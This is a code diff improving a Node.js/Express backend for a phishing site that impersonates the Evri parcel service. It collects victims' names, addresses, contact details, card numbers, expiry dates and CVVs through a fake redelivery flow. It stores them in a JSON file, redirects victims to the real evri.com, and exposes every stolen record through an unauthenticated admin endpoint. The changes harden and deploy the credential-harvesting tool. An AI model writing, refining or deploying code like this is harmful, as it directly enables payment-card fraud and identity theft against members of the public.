@@ -2,6 +2,8 @@ const express = require('express');
 const fs = require('fs');
 const bodyParser = require('body-parser');
 const app = express();
+
+// If you are on Render with a disk, you can use /data/data.json instead
 const dataFile = 'data.json';
 
 app.use(express.static('public'));
@@ -9,16 +11,24 @@ app.use(bodyParser.urlencoded({ extended: true }));
 
 function loadData() {
   if (!fs.existsSync(dataFile)) return [];
-  return JSON.parse(fs.readFileSync(dataFile));
+  try {
+    const raw = fs.readFileSync(dataFile);
+    const parsed = JSON.parse(raw);
+    return Array.isArray(parsed) ? parsed : [];
+  } catch (e) {
+    return [];
+  }
 }
+
 function saveData(data) {
   fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
 }
 
-// Step 1
+// STEP 1 – create new record
 app.post('/details', (req, res) => {
-  let data = loadData();
-  let entry = {
+  const data = loadData();
+
+  const entry = {
     firstName: req.body.firstName,
     lastName: req.body.lastName,
     addr1: req.body.addr1,
@@ -27,36 +37,48 @@ app.post('/details', (req, res) => {
     email: req.body.email,
     phone: req.body.phone
   };
-  data.push(entry);
+
+  data.push(entry);          // append, never replace
   saveData(data);
   res.redirect('/selectdate.html');
 });
 
-// Step 2
+// STEP 2 – update last record with delivery date
 app.post('/delivery-date', (req, res) => {
-  let data = loadData();
+  const data = loadData();
+  if (data.length === 0) {
+    return res.redirect('/redelivery.html');
+  }
   data[data.length - 1].deliveryDate = req.body.deliveryDate;
   saveData(data);
   res.redirect('/payment.html');
 });
 
-// Step 3: Redirect to real Evri
+// STEP 3 – update last record with card info + timestamp
 app.post('/payment', (req, res) => {
-  let data = loadData();
-  data[data.length - 1].cardnum = req.body.cardnum;
-  data[data.length - 1].exp = req.body.exp;
-  data[data.length - 1].cvv = req.body.cvv;
-  data[data.length - 1].submitted = new Date().toISOString();
+  const data = loadData();
+  if (data.length === 0) {
+    return res.redirect('/redelivery.html');
+  }
+
+  const last = data[data.length - 1];
+  last.cardnum   = req.body.cardnum;
+  last.exp       = req.body.exp;
+  last.cvv       = req.body.cvv;
+  last.submitted = new Date().toISOString();
+
   saveData(data);
   res.redirect('https://www.evri.com/');
 });
 
-// Admin
+// ADMIN API – return ALL records (no 30‑day filter for now)
 app.get('/admin-data', (req, res) => {
-  let data = loadData();
-  let cutoff = Date.now() - 30*24*60*60*1000;
-  let recent = data.filter(d => new Date(d.submitted).getTime() > cutoff);
-  res.json(recent);
+  const data = loadData();
+  res.json(data);
 });
 
-app.listen(3000, () => console.log('Server running at http://localhost:3000'));
+// Start server (change port if you use 3000 instead)
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server running at http://localhost:${PORT}`);
+});
